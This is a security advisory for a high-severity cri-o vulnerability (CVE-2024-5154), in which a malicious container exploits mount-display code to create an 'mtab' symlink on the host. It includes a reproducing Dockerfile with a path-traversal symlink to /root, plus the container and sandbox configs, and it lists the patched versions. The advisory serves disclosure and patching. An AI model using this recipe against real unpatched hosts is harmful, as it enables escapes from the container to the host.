# malicious container creates symlink "mtab" on the host External

**GHSA**: GHSA-j9hf-98c3-wrm8 | **CVE**: CVE-2024-5154 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-22, CWE-668

**Affected Packages**:
- **github.com/cri-o/cri-o** (go): >= 1.28.6, < 1.28.7
- **github.com/cri-o/cri-o** (go): >= 1.29.4, < 1.29.5
- **github.com/cri-o/cri-o** (go): >= 1.30.0, < 1.30.1

## Description

### Impact
A malicious container can affect the host by taking advantage of code cri-o added to show the container mounts on the host.

A workload built from this Dockerfile:
```
FROM docker.io/library/busybox as source
RUN mkdir /extra && cd /extra && ln -s ../../../../../../../../root etc

FROM scratch

COPY --from=source /bin /bin
COPY --from=source /lib /lib
COPY --from=source /extra .

```

and this container config:

```
{
  "metadata": {
      "name": "busybox"
  },
  "image":{
      "image": "localhost/test"
  },
  "command": [
      "/bin/true"
  ],
  "linux": {
  }
}


```
and this sandbox config  
```
{
  "metadata": {
    "name": "test-sandbox",
    "namespace": "default",
    "attempt": 1,
    "uid": "edishd83djaideaduwk28bcsb"
  },
  "linux": {
    "security_context": {
      "namespace_options": {
        "network": 2
      }
    }
  }
}

```

will create a file on host `/host/mtab`

### Patches
1.30.1, 1.29.5, 1.28.7

### Workarounds
Unfortunately not

### References
_Are there any links users can visit to find out more?_
